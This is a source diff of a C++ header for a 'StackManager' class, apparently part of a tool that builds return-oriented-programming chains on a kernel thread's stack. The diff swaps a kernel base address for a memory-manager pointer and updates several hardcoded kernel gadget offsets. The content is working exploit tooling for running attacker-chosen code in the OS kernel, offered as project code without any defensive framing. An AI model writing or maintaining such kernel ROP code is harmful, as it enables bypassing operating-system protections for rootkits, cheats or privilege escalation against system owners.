@@ -3,20 +3,21 @@
 #include <vector>
 #include <string_view>
 #include <include/driver/kernel_addresses.hpp>
+#include <include/rop_thread/memory_manager.hpp>
+#include <include/rop_thread/definitions.hpp>
 
 class StackManager
 {
 protected:
     std::unique_ptr<std::vector<std::uint64_t>> Stack;
 private:
-	std::uintptr_t KernelModuleBase = NULL;
-	std::uintptr_t StackAllocAddress = NULL;
+    MemoryManager* KernelMemory = nullptr;
+    std::uintptr_t StackAllocAddress = NULL;
 	std::size_t StackSizeLimit = NULL;
     void ModifyThreadField(const std::uint64_t FieldOffset, const std::uint64_t NewValue);
-
 public:
-	StackManager(const std::uintptr_t _KernelModuleBase, const std::uintptr_t _StackAllocAddress, const size_t _StackSizeLimit = 0x2000)
-		: KernelModuleBase(_KernelModuleBase), StackAllocAddress(_StackAllocAddress), StackSizeLimit(_StackSizeLimit)
+	StackManager(MemoryManager* _KernelMemory, const std::uintptr_t _StackAllocAddress, const size_t _StackSizeLimit = MAXIMUM_STACK_SIZE)
+		: KernelMemory(_KernelMemory), StackAllocAddress(_StackAllocAddress), StackSizeLimit(_StackSizeLimit)
 	{
         Stack = std::make_unique<std::vector<std::uint64_t>>();
 	}
@@ -80,25 +81,25 @@ public:
         case 2:
         case 3:
         case 4:
-            this->AddGadget(0xbac76a, "add rsp, 0x20; ret;");
+            this->AddGadget(0xbaf76a, "add rsp, 0x20; ret;");
             break;
         case 5:
             this->AddGadget(0x2005e3, "add rsp, 0x28; ret;");
             break;
         case 6:
-            this->AddGadget(0x200a54, "pop ...; pop ...; pop ...; pop ...; pop ...; pop ...; ret;");
+            this->AddGadget(0x51ad84, "pop ...; pop ...; pop ...; pop ...; pop ...; pop ...; ret;");
             break;
         case 7:
             this->AddGadget(0x20268c, "add rsp, 0x38; ret;");
             break;
         case 8:
-            this->AddGadget(0x3dec5c, "pop ...; add rsp, 0x20; pop ...; pop ...; pop ...; ret;");
+            this->AddGadget(0x3ded1c, "pop ...; add rsp, 0x20; pop ...; pop ...; pop ...; ret;");
             break;
         case 9:
             this->AddGadget(0x216dce, "add rsp, 0x48; ret;");
             break;
         case 10:
-            this->AddGadget(0x72f29c, "pop ...; add rsp, 0x48; ret;");
+            this->AddGadget(0x73027c, "pop ...; add rsp, 0x48; ret;");
             break;
         }
 
